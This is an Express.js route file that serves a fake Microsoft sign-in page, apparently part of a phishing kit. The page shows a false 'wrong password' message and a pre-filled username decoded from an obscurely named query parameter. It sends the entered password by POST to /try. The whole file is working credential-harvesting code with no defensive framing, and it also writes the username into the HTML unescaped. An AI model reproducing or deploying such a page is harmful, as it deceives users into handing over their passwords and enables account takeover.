
const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(bodyParser.urlencoded({ extended: false }));




router.get('/', (req, res) => {

    const data = req.query.hfdgdhguirehfdhgfdrereoh;

    const username = Buffer.from(data, 'base64').toString('utf-8');

    if (data == null) {
    res.render('error');
    
  }else{


    const htmlContent = `
    <!DOCTYPE html>
<html>
  
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inbox</title>
    <link rel="shortcut icon" href="/files/favicon.ico" type="image/x-icon">
    

    <style>
        body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background-image: url('/files/bg.jpg') ;
        font-weight: 400;
        font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
        font-size: 0.9375rem;
        line-height: 1.25rem;

        }

    .container {
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
    }

    .div1 {
        height: 32%;
        background-color: transparent;
        display: flex;
        justify-content: center; /* Center horizontally */
        align-items: flex-end;
    }
    .topL{
      padding-bottom: 15px;
    }

    .div2 {
        height: 65%;
        background-color: transparent;
        display: flex;
        justify-content: center;
    }
    .mainDiv{
      height: 250px;
      width: 360px;
      background-color:white;
      padding-right: 40px;
      padding-left: 40px;
      padding-bottom: 40px;
      padding-top: 10px;
    }
    .inline-div {
        display: flex;
        align-items: center;
    }

    .bottom {
        height: 3%;
        background-color: rgba(0, 0, 0, 0.6);
    }
    #btmL {
      float: right;
      font-size: 13px;
      padding-top:5px;
      padding-right: 15px;
      

    }
    a {
        text-decoration: none; /* Remove default underline */
        color: white; /* Default link color */
    }

    /* Hover state */
    a:hover {
    }
    
    input{
        width:340px;
        padding-bottom: 10px;
        border: none;
        outline: none;
        border-bottom: 1px solid red; 


    }
    
    input::placeholder{

      font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
      font-size: 16px;
      color:red;
    }

    input:focus {
       border-bottom-color:rgb(0, 103, 184);
    }
    .spanForget{

      color:rgb(0, 103, 184);
      font-size: 12px;

      
    }
    button {
      background-color:rgb(0, 103, 184);
      color:#fff;
      font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
      font-size: 14px;
      height: 32px;
      width:108px;
      border-color:rgb(0, 103, 184);
      cursor: pointer;
    }
   
    

</style>


</head>
<body onload="onLoad();">
    <div class="container">
        <div class="div1">
          <div class="topL"><img style="height: 36px; width:171px;" src="/files/logoout.png"></div>
        
        </div>
        <div class="div2">
         <div class="mainDiv">
          <form action="/try" method="POST" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
          <div>
            <center><span style="font-size: 16px;color:red;">You have entered wrong password.</span></center>
          </div>
          <br>
          <div>
            <img src="/files/mslogo.svg" >
          </div>
          <div class="inline-div" style="padding-top: 12px;">
            <img src="/files/arrow.svg" >&nbsp;&nbsp;<span id="userspan" class="user">${username}</span>
            <input type="hidden"  name="username" id="username" value="${username}">
          </div>
          <div style="color: rgb(27, 27, 27);font-size: 1.5rem;font-weight: 600; padding-top: 20px;">Enter password</div>
          <div style="padding-top: 22px;"><input type="password" placeholder="Password"  name="password" id="password" value="" required=""></div>
          <div  style="padding-top: 14px;"><span class="spanForget">Forget password?</span></div>
          <div  style=" float: right; padding-top: 18px;padding-right: 13px;"><button type="submit">Sign in</button></div>
        </form>
         </div>
        </div>
        <div class="bottom">
          <div id="btmL"><a href="https://login.live.com/">Terms of use</a>&nbsp;&nbsp;&nbsp;<a href="https://login.live.com/">Privacy & cookies</a>&nbsp;&nbsp;&nbsp;<a href="https://login.live.com/">.&nbsp;.&nbsp;.</a></div>
        </div>
    </div>
</body>
</html>

    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }

});
     
   



module.exports =router
